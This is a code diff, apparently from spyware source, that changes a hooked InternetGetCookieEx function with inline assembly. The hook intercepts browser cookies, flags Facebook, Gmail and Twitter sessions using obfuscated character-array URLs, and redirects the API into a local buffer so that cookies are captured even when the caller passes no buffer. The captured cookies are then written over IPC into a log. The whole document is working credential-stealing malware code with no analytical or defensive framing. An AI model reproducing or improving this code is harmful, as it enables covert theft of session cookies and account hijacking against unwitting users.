@@ -412,6 +412,8 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	DWORD origin;
 	DWORD old_flags;
 	DWORD old_size;
+	DWORD old_buffer;
+	DWORD local_size;
 
 	MARK_HOOK
 	INIT_WRAPPER(InternetGetCookieExStruct)
@@ -419,10 +421,13 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
 	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR local_cookie[2048];
+
+	local_size = sizeof(local_cookie)/sizeof(WCHAR);
 
 	// Cerca di capire se si tratta di un dominio interessante
 	origin = COOKIE_IEXPLORER;
-	if (pData->pStrStrW && lpszCookieData && lpszURL) {
+	if (pData->pStrStrW && lpszURL) {
 		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
 			origin |= COOKIE_FACEBOOK;
 		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url))
@@ -442,16 +447,24 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV [old_flags], EAX
 		MOV EAX, DWORD PTR [EBP+0x14]
 		MOV [old_size], EAX
+		MOV EAX, DWORD PTR [EBP+0x0C]
+		MOV [old_buffer], EAX
+
 		MOV EAX, 0x00002000
 		MOV DWORD PTR [EBP+0x18], EAX
+		LEA EAX, local_size
+		MOV DWORD PTR [EBP+0x14], EAX
+		LEA EAX, local_cookie
+		MOV DWORD PTR [EBP+0x0C], EAX
+
 		POP EAX
 	}
 
 	CALL_ORIGINAL_API_SEQ(6)
 
 	if (ret_code) {
-		WCSLEN(lpszCookieData, name_len);
-		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)lpszCookieData, (name_len+1)*sizeof(WCHAR), origin, IPC_DEF_PRIORITY);
+		WCSLEN(local_cookie, name_len);
+		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)local_cookie, (name_len+1)*sizeof(WCHAR), origin, IPC_DEF_PRIORITY);
 	}
 
 	// Rimette i parametri originali e richiama la funzione
@@ -461,6 +474,9 @@ BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, L
 		MOV DWORD PTR [EBP+0x14], EAX
 		MOV EAX, [old_flags]
 		MOV DWORD PTR [EBP+0x18], EAX
+		MOV EAX, [old_buffer]
+		MOV DWORD PTR [EBP+0x0C], EAX
+
 		POP EAX
 	}
 	CALL_ORIGINAL_API_SEQ(6)
